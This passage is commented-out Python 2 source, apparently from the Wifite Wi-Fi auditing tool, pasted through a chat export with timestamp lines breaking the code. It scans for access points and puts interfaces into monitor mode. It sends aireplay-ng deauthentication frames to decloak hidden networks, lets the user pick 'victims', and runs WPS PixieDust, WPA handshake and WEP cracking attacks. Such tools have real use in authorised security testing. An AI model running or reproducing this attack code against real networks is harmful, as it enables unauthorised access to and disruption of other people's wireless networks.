#         wep_group.add_argument('-p0841', help=argparse.SUPPRESS, default=False, action='store_true', dest='p0841')
#         wep_group.add_argument('--hirte', help='Use hirte attack.', default=False, action='store_true', dest='hirte')
#         wep_group.add_argument('-hirte', help=argparse.SUPPRESS, default=False, action='store_true', dest='hirte')
#         wep_group.add_argument('--nofakeauth', help='Stop attack if fake authentication fails.', default=False,
#                                action='store_true', dest='fakeauth')
#         wep_group.add_argument('-nofakeauth', help=argparse.SUPPRESS, default=False, action='store_true',
#                                dest='fakeauth')
#         wep_group.add_argument('--wepca', help='Start cracking when number of IVs surpass [n].', action='store',
#                                dest='wepca')
#         wep_group.add_argument('-wepca', help=argparse.SUPPRESS, action='store', dest='wepca')
#         wep_group.add_argument('--wepsave', help='Save a copy of .cap files to this directory.', default=None,
#                                action='store', dest='wepsave')
#         wep_group.add_argument('-wepsave', help=argparse.SUPPRESS, default=None, action='store', dest='wepsave')
#         # set WPS commands
#         wps_group = option_parser.add_argument_group('WPS')
#         wps_group.add_argument('--wps', help='Only target WPS networks.', default=False, action='store_true',
#                                dest='wps')
#         wps_group.add_argument('-wps', help=argparse.SUPPRESS, default=False, action='store_true', dest='wps')
#         wps_group.add_argument('--pixie', help='Only use the WPS PixieDust attack', default=False, action='store_true', dest='pixie')
#         wps_group.add_argument('--wpst', help='Max wait for new retry before giving up (0: never).', action='store',
#                                dest='wpst')

# ., [18.01.2024 4:16]
# wps_group.add_argument('-wpst', help=argparse.SUPPRESS, action='store', dest='wpst')
#         wps_group.add_argument('--wpsratio', help='Min ratio of successful PIN attempts/total retries.', action='store',
#                                dest='wpsratio')
#         wps_group.add_argument('-wpsratio', help=argparse.SUPPRESS, action='store', dest='wpsratio')
#         wps_group.add_argument('--wpsretry', help='Max number of retries for same PIN before giving up.',
#                                action='store', dest='wpsretry')
#         wps_group.add_argument('-wpsretry', help=argparse.SUPPRESS, action='store', dest='wpsretry')

#         return option_parser


# class RunEngine:
#     def init(self, run_config):
#         self.RUN_CONFIG = run_config
#         self.RUN_CONFIG.RUN_ENGINE = self

#     def initial_check(self):
#         """
#             Ensures required programs are installed.
#         """
#         airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
#         for air in airs:
#             if program_exists(air): continue
#             print R + ' [!]' + O + ' required program not found: %s' % (R + air + W)
#             print R + ' [!]' + O + ' this program is bundled with the aircrack-ng suite:' + W
#             print R + ' [!]' + O + '        ' + C + 'http://www.aircrack-ng.org/' + W
#             print R + ' [!]' + O + ' or: ' + W + 'sudo apt-get install aircrack-ng\n' + W
#             self.RUN_CONFIG.exit_gracefully(1)

#         if not program_exists('iw'):
#             print R + ' [!]' + O + ' airmon-ng requires the program %s\n' % (R + 'iw' + W)
#             self.RUN_CONFIG.exit_gracefully(1)

#         if not program_exists('iwconfig'):
#             print R + ' [!]' + O + ' wifite requires the program %s\n' % (R + 'iwconfig' + W)
#             self.RUN_CONFIG.exit_gracefully(1)

#         if not program_exists('ifconfig'):
#             print R + ' [!]' + O + ' wifite requires the program %s\n' % (R + 'ifconfig' + W)
#             self.RUN_CONFIG.exit_gracefully(1)

#         printed = False
#         # Check reaver
#         if not program_exists('reaver'):
#             printed = True
#             print R + ' [!]' + O + ' the program ' + R + 'reaver' + O + ' is required for WPS attacks' + W
#             print R + '    ' + O + '   available at ' + C + 'http://code.google.com/p/reaver-wps' + W
#             self.RUN_CONFIG.WPS_DISABLE = True

#         if not program_exists('tshark'):
#             printed = True
#             print R + ' [!]' + O + ' the program ' + R + 'tshark' + O + ' was not found' + W
#             print R + ' [!]' + O + ' please install tshark: https://www.wireshark.org/#download' + W
#             self.RUN_CONFIG.WPS_DISABLE = True

#         # Check handshake-checking apps
#         recs = ['pyrit', 'cowpatty']
#         for rec in recs:
#             if program_exists(rec): continue
#             printed = True
#             print R + ' [!]' + O + ' the program %s is not required, but is recommended%s' % (R + rec + O, W)
#         if printed: print ''

#     def enable_monitor_mode(self, iface):
#         """
#             First attempts to anonymize the MAC if requested; MACs cannot
#             be anonymized if they're already in monitor mode.
#             Uses airmon-ng to put a device into Monitor Mode.
#             Then uses the get_iface() method to retrieve the new interface's name.
#             Sets global variable IFACE_TO_TAKE_DOWN as well.
#             Returns the name of the interface in monitor mode.
#         """
#         mac_anonymize(iface)
#         print GR + ' [+]' + W + ' enabling monitor mode on %s...' % (G + iface + W),
#         stdout.flush()
#         call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
#         print 'done'
#         self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart

# ., [18.01.2024 4:16]
# self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()
#         if self.RUN_CONFIG.TX_POWER > 0:
#             print GR + ' [+]' + W + ' setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W),
#             call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
#             call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
#             print 'done'
#         return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

#     def disable_monitor_mode(self):
#         """
#             The program may have enabled monitor mode on a wireless interface.
#             We want to disable this before we exit, so we will do that.
#         """
#         if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return
#         print GR + ' [+]' + W + ' disabling monitor mode on %s...' % (G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W),
#         stdout.flush()
#         call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
#         print 'done'

#     def rtl8187_fix(self, iface):
#         """
#             Attempts to solve "Unknown error 132" common with RTL8187 devices.
#             Puts down interface, unloads/reloads driver module, then puts iface back up.
#             Returns True if fix was attempted, False otherwise.
#         """
#         # Check if current interface is using the RTL8187 chipset
#         proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
#         proc_airmon.wait()
#         using_rtl8187 = False
#         for line in proc_airmon.communicate()[0].split():
#             line = line.upper()
#             if line.strip() == '' or line.startswith('INTERFACE'): continue
#             if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

#         if not using_rtl8187:
#             # Display error message and exit
#             print R + ' [!]' + O + ' unable to generate airodump-ng CSV file' + W
#             print R + ' [!]' + O + ' you may want to disconnect/reconnect your wifi device' + W
#             self.RUN_CONFIG.exit_gracefully(1)

#         print O + " [!]" + W + " attempting " + O + "RTL8187 'Unknown Error 132'" + W + " fix..."

#         original_iface = iface
#         # Take device out of monitor mode
#         airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)
#         airmon.wait()
#         for line in airmon.communicate()[0].split('\n'):
#             if line.strip() == '' or \
#                     line.startswith("Interface") or \
#                             line.find('(removed)') != -1:
#                 continue
#             original_iface = line.split()[0]  # line[:line.find('\t')]

#         # Remove drive modules, block/unblock ifaces, probe new modules.
#         print_and_exec(['ifconfig', original_iface, 'down'])
#         print_and_exec(['rmmod', 'rtl8187'])
#         print_and_exec(['rfkill', 'block', 'all'])
#         print_and_exec(['rfkill', 'unblock', 'all'])
#         print_and_exec(['modprobe', 'rtl8187'])
#         print_and_exec(['ifconfig', original_iface, 'up'])
#         print_and_exec(['airmon-ng', 'start', original_iface])

#         print '\r                                                        \r',
#         print O + ' [!] ' + W + 'restarting scan...\n'

#         return True

#     def get_iface(self):
#         """
#             Get the wireless interface in monitor mode.
#             Defaults to only device in monitor mode if found.
#             Otherwise, enumerates list of possible wifi devices
#             and asks user to select one to put into monitor mode (if multiple).
#             Uses airmon-ng to put device in monitor mode if needed.
#             Returns the name (string) of the interface chosen in monitor mode.
#         """
#         if not self.RUN_CONFIG.PRINTED_SCANNING:
#             print GR + ' [+]' + W + ' scanning for wireless devices...'
#             self.RUN_CONFIG.PRINTED_SCANNING = True

# ., [18.01.2024 4:16]
# proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
#         iface = ''
#         monitors = []
#         adapters = []
#         for line in proc.communicate()[0].split('\n'):
#             if len(line) == 0: continue
#             if ord(line[0]) != 32:  # Doesn't start with space
#                 iface = line[:line.find(' ')]  # is the interface
#             if line.find('Mode:Monitor') != -1:
#                 monitors.append(iface)
#             else:
#                 adapters.append(iface)

#         if self.RUN_CONFIG.WIRELESS_IFACE != '':
#             if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE):
#                 return self.RUN_CONFIG.WIRELESS_IFACE
#             else:
#                 if self.RUN_CONFIG.WIRELESS_IFACE in adapters:
#                     # valid adapter, enable monitor mode
#                     print R + ' [!]' + O + ' could not find wireless interface %s in monitor mode' % (
#                     R + '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O)
#                     return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
#                 else:
#                     # couldnt find the requested adapter
#                     print R + ' [!]' + O + ' could not find wireless interface %s' % (
#                     '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + O + '"' + W)
#                     self.RUN_CONFIG.exit_gracefully(0)

#         if len(monitors) == 1:
#             return monitors[0]  # Default to only device in monitor mode
#         elif len(monitors) > 1:
#             print GR + " [+]" + W + " interfaces in " + G + "monitor mode:" + W
#             for i, monitor in enumerate(monitors):
#                 print "  %s. %s" % (G + str(i + 1) + W, G + monitor + W)
#             ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
#                            (GR, W, G, W, G, len(monitors), W, G))
#             while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
#                 ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
#                                (GR, W, G, len(monitors), W, G))
#             i = int(ri)
#             return monitors[i - 1]

#         proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
#         for line in proc.communicate()[0].split('\n'):
#             if len(line) == 0 or line.startswith('Interface') or line.startswith('PHY'): continue
#             monitors.append(line)

#         if len(monitors) == 0:
#             print R + ' [!]' + O + " no wireless interfaces were found." + W
#             print R + ' [!]' + O + " you need to plug in a wifi device or install drivers.\n" + W
#             self.RUN_CONFIG.exit_gracefully(0)
#         elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:
#             monitor = monitors[0][:monitors[0].find('\t')]
#             return self.enable_monitor_mode(monitor)

#         elif len(monitors) == 1:
#             monitor = monitors[0][:monitors[0].find('\t')]
#             if monitor.startswith('phy'): monitor = monitors[0].split()[1]
#             return self.enable_monitor_mode(monitor)

#         print GR + " [+]" + W + " available wireless devices:"
#         for i, monitor in enumerate(monitors):
#             print "  %s%d%s. %s" % (G, i + 1, W, monitor)

#         ri = raw_input(
#             GR + " [+]" + W + " select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
#         while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
#             ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
#         i = int(ri)
#         monitor = monitors[i - 1][:monitors[i - 1].find('\t')]

#         return self.enable_monitor_mode(monitor)

#     def scan(self, channel=0, iface='', tried_rtl8187_fix=False):

# ., [18.01.2024 4:16]
# """
#             Scans for access points. Asks user to select target(s).
#                 "channel" - the channel to scan on, 0 scans all channels.
#                 "iface"   - the interface to scan on. must be a real interface.
#                 "tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
#             Returns list of selected targets and list of clients.
#         """
#         airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')
#         csv_file = airodump_file_prefix + '-01.csv'
#         cap_file = airodump_file_prefix + '-01.cap'
#         remove_airodump_files(airodump_file_prefix)

#         command = ['airodump-ng',
#                    '-a',  # only show associated clients
#                    '--write-interval', '1', # Write every second
#                    '-w', airodump_file_prefix]  # output file
#         if channel != 0:
#             command.append('-c')
#             command.append(str(channel))
#         command.append(iface)

#         proc = Popen(command, stdout=DN, stderr=DN)

#         time_started = time.time()
#         print GR + ' [+] ' + G + 'initializing scan' + W + ' (' + G + iface + W + '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.'
#         (targets, clients) = ([], [])
#         try:
#             deauth_sent = 0.0
#             old_targets = []
#             stop_scanning = False
#             while True:
#                 time.sleep(0.3)
#                 if not os.path.exists(csv_file) and time.time() - time_started > 1.0:
#                     print R + '\n [!] ERROR!' + W
#                     # RTL8187 Unknown Error 132 FIX
#                     if proc.poll() is not None:  # Check if process has finished
#                         proc = Popen(['airodump-ng', iface], stdout=DN, stderr=PIPE)
#                         if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
#                             send_interrupt(proc)
#                             if self.rtl8187_fix(iface):
#                                 return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
#                     print R + ' [!]' + O + ' wifite is unable to generate airodump-ng output files' + W
#                     print R + ' [!]' + O + ' you may want to disconnect/reconnect your wifi device' + W
#                     self.RUN_CONFIG.exit_gracefully(1)

#                 (targets, clients) = self.parse_csv(csv_file)

#                 # Remove any already cracked networks if configured to do so
#                 if self.RUN_CONFIG.SHOW_ALREADY_CRACKED == False:
#                     index = 0
#                     while index < len(targets):
#                         already = False
#                         for cracked in self.RUN_CONFIG.CRACKED_TARGETS:
#                             if targets[index].ssid.lower() == cracked.ssid.lower():
#                                 already = True
#                             if targets[index].bssid.lower() == cracked.bssid.lower():
#                                 already = True
#                         if already == True:
#                             targets.pop(index)
#                             index -= 1
#                         index += 1

#                 # If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
#                 if self.RUN_CONFIG.TARGET_ESSID != '':
#                     for t in targets:
#                         if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
#                             send_interrupt(proc)
#                             try:
#                                 os.kill(proc.pid, SIGTERM)
#                             except OSError:
#                                 pass
#                             except UnboundLocalError:
#                                 pass
#                             targets = [t]

# ., [18.01.2024 4:16]
# stop_scanning = True
#                             break
#                 if self.RUN_CONFIG.TARGET_BSSID != '':
#                     for t in targets:
#                         if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
#                             send_interrupt(proc)
#                             try:
#                                 os.kill(proc.pid, SIGTERM)
#                             except OSError:
#                                 pass
#                             except UnboundLocalError:
#                                 pass
#                             targets = [t]
#                             stop_scanning = True
#                             break

#                 # If user has chosen to target all access points, wait 20 seconds, then return all
#                 if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
#                     print GR + '\n [+]' + W + ' auto-targeted %s%d%s access point%s' % (
#                     G, len(targets), W, '' if len(targets) == 1 else 's')
#                     stop_scanning = True

#                 if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
#                     # Remove targets with power < threshold
#                     i = 0
#                     before_count = len(targets)
#                     while i < len(targets):
#                         if targets[i].power < self.RUN_CONFIG.ATTACK_MIN_POWER:
#                             targets.pop(i)
#                         else:
#                             i += 1
#                     print GR + '\n [+]' + W + ' removed %s targets with power < %ddB, %s remain' % \
#                                               (G + str(before_count - len(targets)) + W,
#                                                self.RUN_CONFIG.ATTACK_MIN_POWER, G + str(len(targets)) + W)
#                     stop_scanning = True

#                 if stop_scanning: break

#                 # If there are unknown SSIDs, send deauths to them.
#                 if self.RUN_CONFIG.SEND_DEAUTHS and channel != 0 and time.time() - deauth_sent > 5:
#                     deauth_sent = time.time()
#                     for t in targets:
#                         if t.ssid == '' or '\x00' in t.ssid or '\\x00' in t.ssid:
#                             print "\r %s deauthing hidden access point (%s)               \r" % \
#                                   (GR + sec_to_hms(time.time() - time_started) + W, G + t.bssid + W),
#                             stdout.flush()
#                             # Time to deauth
#                             cmd = ['aireplay-ng',
#                                    '--ignore-negative-one',
#                                    '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
#                                    '-a', t.bssid]
#                             for c in clients:
#                                 if c.station == t.bssid:
#                                     cmd.append('-c')
#                                     cmd.append(c.bssid)
#                                     break
#                             cmd.append(iface)
#                             proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
#                             proc_aireplay.wait()
#                             time.sleep(0.5)
#                         else:
#                             for ot in old_targets:
#                                 if ot.ssid == '' and ot.bssid == t.bssid:
#                                     print '\r %s successfully decloaked "%s"                     ' % \
#                                           (GR + sec_to_hms(time.time() - time_started) + W, G + t.ssid + W)

#                     old_targets = targets[:]
#                 if self.RUN_CONFIG.VERBOSE_APS and len(targets) > 0:
#                     targets = sorted(targets, key=lambda t: t.power, reverse=True)
#                     if not self.RUN_CONFIG.WPS_DISABLE:
#                         wps_check_targets(targets, cap_file, verbose=False)

# ., [18.01.2024 4:16]
# os.system('clear')
#                     print GR + '\n [+] ' + G + 'scanning' + W + ' (' + G + iface + W + '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.\n'
#                     print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
#                     'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
#                     print '   --- --------------------  %s--  ----  -----  ----  ------' % (
#                     '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
#                     for i, target in enumerate(targets):
#                         print "   %s%2d%s " % (G, i + 1, W),
#                         # SSID
#                         if target.ssid == '' or '\x00' in target.ssid or '\\x00' in target.ssid:
#                             p = O + '(' + target.bssid + ')' + GR + ' ' + W
#                             print '%s' % p.ljust(20),
#                         elif len(target.ssid) <= 20:
#                             print "%s" % C + target.ssid.ljust(20) + W,
#                         else:
#                             print "%s" % C + target.ssid[0:17] + '...' + W,
#                         # BSSID
#                         if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
#                             print O, target.bssid + W,
#                         # Channel
#                         print G + target.channel.rjust(3), W,
#                         # Encryption
#                         if target.encryption.find("WEP") != -1:
#                             print G,
#                         else:
#                             print O,
#                         print "\b%3s" % target.encryption.strip().ljust(4) + W,
#                         # Power
#                         if target.power >= 55:
#                             col = G
#                         elif target.power >= 40:
#                             col = O
#                         else:
#                             col = R
#                         print "%s%3ddb%s" % (col, target.power, W),
#                         # WPS
#                         if self.RUN_CONFIG.WPS_DISABLE:
#                             print "  %3s" % (O + 'n/a' + W),
#                         else:
#                             print "  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W),
#                         # Clients
#                         client_text = ''
#                         for c in clients:
#                             if c.station == target.bssid:
#                                 if client_text == '':
#                                     client_text = 'client'
#                                 elif client_text[-1] != "s":
#                                     client_text += "s"
#                         if client_text != '':
#                             print '  %s' % (G + client_text + W)
#                         else:
#                             print ''
#                     print ''
#                 print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
#                     GR + sec_to_hms(time.time() - time_started) + W, G + 'scanning' + W,
#                     G + str(len(targets)) + W, '' if len(targets) == 1 else 's',
#                     G + str(len(clients)) + W, '' if len(clients) == 1 else 's'),

#                 stdout.flush()
#         except KeyboardInterrupt:
#             pass
#         print ''

#         send_interrupt(proc)
#         try:
#             os.kill(proc.pid, SIGTERM)
#         except OSError:
#             pass
#         except UnboundLocalError:
#             pass

#         # Use "tshark" program to check for WPS compatibility
#         if not self.RUN_CONFIG.WPS_DISABLE:
#             wps_check_targets(targets, cap_file)

#         remove_airodump_files(airodump_file_prefix)

#         if stop_scanning:
#             return (targets, clients)
#         print ''

#         if len(targets) == 0:
#             print R + ' [!]' + O + ' no targets found!' + W
#             print R + ' [!]' + O + ' you may need to wait for targets to show up.' + W
#             print ''
#             self.RUN_CONFIG.exit_gracefully(1)

# ., [18.01.2024 4:16]
# if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')

#         # Sort by Power
#         targets = sorted(targets, key=lambda t: t.power, reverse=True)

#         victims = []
#         print "   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
#         'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
#         print '   --- --------------------  %s--  ----  -----  ----  ------' % (
#         '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')
#         for i, target in enumerate(targets):
#             print "   %s%2d%s " % (G, i + 1, W),
#             # SSID
#             if target.ssid == '' or '\x00' in target.ssid or '\\x00' in target.ssid:
#                 p = O + '(' + target.bssid + ')' + GR + ' ' + W
#                 print '%s' % p.ljust(20),
#             elif len(target.ssid) <= 20:
#                 print "%s" % C + target.ssid.ljust(20) + W,
#             else:
#                 print "%s" % C + target.ssid[0:17] + '...' + W,
#             # BSSID
#             if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
#                 print O, target.bssid + W,
#             # Channel
#             print G + target.channel.rjust(3), W,
#             # Encryption
#             if target.encryption.find("WEP") != -1:
#                 print G,
#             else:
#                 print O,
#             print "\b%3s" % target.encryption.strip().ljust(4) + W,
#             # Power
#             if target.power >= 55:
#                 col = G
#             elif target.power >= 40:
#                 col = O
#             else:
#                 col = R
#             print "%s%3ddb%s" % (col, target.power, W),
#             # WPS
#             if self.RUN_CONFIG.WPS_DISABLE:
#                 print "  %3s" % (O + 'n/a' + W),
#             else:
#                 print "  %3s" % (G + 'wps' + W if target.wps else R + ' no' + W),
#             # Clients
#             client_text = ''
#             for c in clients:
#                 if c.station == target.bssid:
#                     if client_text == '':
#                         client_text = 'client'
#                     elif client_text[-1] != "s":
#                         client_text += "s"
#             if client_text != '':
#                 print '  %s' % (G + client_text + W)
#             else:
#                 print ''

#         ri = raw_input(
#             GR + "\n [+]" + W + " select " + G + "target numbers" + W + " (" + G + "1-%s)" % (str(len(targets)) + W) + \
#             " separated by commas, or '%s': " % (G + 'all' + W))
#         if ri.strip().lower() == 'all':
#             victims = targets[:]
#         else:
#             for r in ri.split(','):
#                 r = r.strip()
#                 if r.find('-') != -1:
#                     (sx, sy) = r.split('-')
#                     if sx.isdigit() and sy.isdigit():
#                         x = int(sx)
#                         y = int(sy) + 1
#                         for v in xrange(x, y):
#                             victims.append(targets[v - 1])
#                 elif not r.isdigit() and r.strip() != '':
#                     print O + " [!]" + R + " not a number: %s " % (O + r + W)
#                 elif r != '':
#                     victims.append(targets[int(r) - 1])

#         if len(victims) == 0:
#             print O + '\n [!] ' + R + 'no targets selected.\n' + W
#             self.RUN_CONFIG.exit_gracefully(0)

#         print ''
#         print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')

#         return (victims, clients)

#     def Start(self):
#         self.RUN_CONFIG.CreateTempFolder()
#         self.RUN_CONFIG.handle_args()
#         self.RUN_CONFIG.ConfirmRunningAsRoot()
#         self.RUN_CONFIG.ConfirmCorrectPlatform()

#         self.initial_check()  # Ensure required programs are installed.

#         # Use an interface already in monitor mode if it has been provided,

# ., [18.01.2024 4:16]
# if self.RUN_CONFIG.MONITOR_IFACE != '':
#             iface = self.RUN_CONFIG.MONITOR_IFACE
#         else:
#             # The "get_iface" method anonymizes the MAC address (if needed)
#             # and puts the interface into monitor mode.
#             iface = self.get_iface()
#         self.RUN_CONFIG.THIS_MAC = get_mac_address(iface)  # Store current MAC address

#         (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)

#         try:
#             index = 0
#             while index < len(targets):
#                 target = targets[index]
#                 # Check if we have already cracked this target
#                 for already in RUN_CONFIG.CRACKED_TARGETS:
#                     if already.bssid == targets[index].bssid:
#                         if RUN_CONFIG.SHOW_ALREADY_CRACKED == True:
#                             print R + '\n [!]' + O + ' you have already cracked this access point\'s key!' + W
#                             print R + ' [!] %s' % (C + already.ssid + W + ': "' + G + already.key + W + '"')
#                             ri = raw_input(
#                                 GR + ' [+] ' + W + 'do you want to crack this access point again? (' + G + 'y/' + O + 'n' + W + '): ')
#                             if ri.lower() == 'n':
#                                 targets.pop(index)
#                                 index -= 1
#                         else:
#                             targets.pop(index)
#                             index -= 1
#                         break

#                 # Check if handshakes already exist, ask user whether to skip targets or save new handshakes
#                 handshake_file = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
#                                  + '_' + target.bssid.replace(':', '-') + '.cap'
#                 if os.path.exists(handshake_file):
#                     print R + '\n [!] ' + O + 'you already have a handshake file for %s:' % (C + target.ssid + W)
#                     print '        %s\n' % (G + handshake_file + W)
#                     print GR + ' [+]' + W + ' do you want to ' + G + '[s]kip' + W + ', ' + O + '[c]apture again' + W + ', or ' + R + '[o]verwrite' + W + '?'
#                     ri = 'x'
#                     while ri != 's' and ri != 'c' and ri != 'o':
#                         ri = raw_input(
#                             GR + ' [+] ' + W + 'enter ' + G + 's' + W + ', ' + O + 'c,' + W + ' or ' + R + 'o' + W + ': ' + G).lower()
#                     print W + "\b",
#                     if ri == 's':
#                         targets.pop(index)
#                         index -= 1
#                     elif ri == 'o':
#                         remove_file(handshake_file)
#                         continue
#                 index += 1


#         except KeyboardInterrupt:
#             print '\n ' + R + '(^C)' + O + ' interrupted\n'
#             self.RUN_CONFIG.exit_gracefully(0)

#         wpa_success = 0
#         wep_success = 0
#         wpa_total = 0
#         wep_total = 0

#         self.RUN_CONFIG.TARGETS_REMAINING = len(targets)
#         for t in targets:
#             self.RUN_CONFIG.TARGETS_REMAINING -= 1

#             # Build list of clients connected to target
#             ts_clients = []
#             for c in clients:
#                 if c.station == t.bssid:
#                     ts_clients.append(c)

#             print ''
#             if t.encryption.find('WPA') != -1:
#                 need_handshake = True
#                 if not self.RUN_CONFIG.WPS_DISABLE and t.wps:
#                     wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)
#                     need_handshake = not wps_attack.RunAttack()
#                     wpa_total += 1

#                 if not need_handshake: wpa_success += 1
#                 if self.RUN_CONFIG.TARGETS_REMAINING < 0: break

# ., [18.01.2024 4:16]
# if not self.RUN_CONFIG.PIXIE and not self.RUN_CONFIG.WPA_DISABLE and need_handshake:
#                     wpa_total += 1
#                     wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
#                     if wpa_attack.RunAttack():
#                         wpa_success += 1

#             elif t.encryption.find('WEP') != -1:
#                 wep_total += 1
#                 wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)
#                 if wep_attack.RunAttack():
#                     wep_success += 1

#             else:
#                 print R + ' unknown encryption:', t.encryption, W

#             # If user wants to stop attacking
#             if self.RUN_CONFIG.TARGETS_REMAINING <= 0: break

#         if wpa_total + wep_total > 0:
#             # Attacks are done! Show results to user
#             print ''
#             print GR + ' [+] %s%d attack%s completed:%s' % (
#             G, wpa_total + wep_total, '' if wpa_total + wep_total == 1 else 's', W)
#             print ''
#             if wpa_total > 0:
#                 if wpa_success == 0:
#                     print GR + ' [+]' + R,
#                 elif wpa_success == wpa_total:
#                     print GR + ' [+]' + G,
#                 else:
#                     print GR + ' [+]' + O,
#                 print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)

#                 for finding in self.RUN_CONFIG.WPA_FINDINGS:
#                     print '        ' + C + finding + W

#             if wep_total > 0:
#                 if wep_success == 0:
#                     print GR + ' [+]' + R,
#                 elif wep_success == wep_total:
#                     print GR + ' [+]' + G,
#                 else:
#                     print GR + ' [+]' + O,
#                 print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)

#                 for finding in self.RUN_CONFIG.WEP_FINDINGS:
#                     print '        ' + C + finding + W

#             caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)
#             if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:
#                 print GR + ' [+]' + W + ' starting ' + G + 'WPA cracker' + W + ' on %s%d handshake%s' % (
#                 G, caps, W if caps == 1 else 's' + W)
#                 for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
#                     wpa_crack(cap, self.RUN_CONFIG)

#         print 
#         self.RUN_CONFIG.exit_gracefully(0)

#     def parse_csv(self, filename):
#         """
#             Parses given lines from airodump-ng CSV file.
#             Returns tuple: List of targets and list of clients.
#         """
#         if not os.path.exists(filename): return ([], [])
#         targets = []
#         clients = []
#         try:
#             hit_clients = False
#             with open(filename, 'rb') as csvfile:
#                 targetreader = csv.reader((line.replace('\0', '') for line in csvfile), delimiter=',')
#                 for row in targetreader:
#                     if len(row) < 2:
#                         continue
#                     if not hit_clients:
#                         if row[0].strip() == 'Station MAC':
#                             hit_clients = True
#                             continue
#                         if len(row) < 14:
#                             continue
#                         if row[0].strip() == 'BSSID':
#                             continue
#                         enc = row[5].strip()
#                         wps = False
#                         # Ignore non-WPA and non-WEP encryption
#                         if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
#                         if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue
#                         if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find(
#                                 'WPA') != -1: continue

# ., [18.01.2024 4:16]
# if enc == "WPA2WPA" or enc == "WPA2 WPA":
#                             enc = "WPA2"
#                             wps = True
#                         if len(enc) > 4:
#                             enc = enc[4:].strip()
#                         power = int(row[8].strip())

#                         ssid = row[13].strip()
#                         ssidlen = int(row[12].strip())
#                         ssid = ssid[:ssidlen]

#                         if power < 0: power += 100
#                         t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
#                         t.wps = wps
#                         targets.append(t)
#                     else:
#                         if len(row) < 6:
#                             continue
#                         bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
#                         station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
#                         power = row[3].strip()
#                         if station != 'notassociated':
#                             c = Client(bssid, station, power)
#                             clients.append(c)
#         except IOError as e:
#             print "I/O error({0}): {1}".format(e.errno, e.strerror)
#             return ([], [])

#         return (targets, clients)

#     def analyze_capfile(self, capfile):
